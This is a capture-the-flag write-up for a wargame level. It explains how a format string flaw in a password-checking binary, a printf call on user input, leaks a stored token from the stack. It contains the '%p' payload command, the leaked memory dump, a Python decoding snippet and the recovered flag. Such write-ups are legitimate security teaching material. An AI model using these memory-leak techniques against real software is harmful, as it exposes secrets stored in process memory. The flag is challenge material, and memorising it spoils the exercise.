# Level02 Format String Attack

## Overview

In this level, we are dealing with a binary that checks a password. The challenge involves bypassing the password check by exploiting a **format string vulnerability**. Below, we break down the main components of the binary's behavior and the exploit strategy.

## Steps

### input
We identified a call to `fgets` in the main function:
```
<main+453> callq  0x4006f0 <fgets@plt>
```
This call suggests that the program reads input from the user.

### Password Comparison
The program compares two strings using `strncmp`:
```c
if (strncmp(ptr, s2, 0x29uLL)) {
    printf(s);
    puts(" does not have access!");
    exit(1);
}
```
It compares the flag we should get and our input. It seems impossible to get it.

### Format String Exploit
They use our input as `printf(s);` argument without formst string. This allows us to perform a **format string attack**.

```c
v9 = fread(ptr, 1uLL, 0x29uLL, stream);
```
We can check they save the token in a variable, `ptr`.

We read the token directly from the stack by printing the stack memory repeatedly.

## Payload
```
level02@OverRide:~$ python -c 'print"%p "*30' > /tmp/02
level02@OverRide:~$ cat /tmp/02 | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4a0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe698 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

We can find 
```
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
```
and convert them to flag
```python
print(
  "\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] +
  "\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] +
  "\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] +
  "\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] +
  "\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1]
)
```

## Flag
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```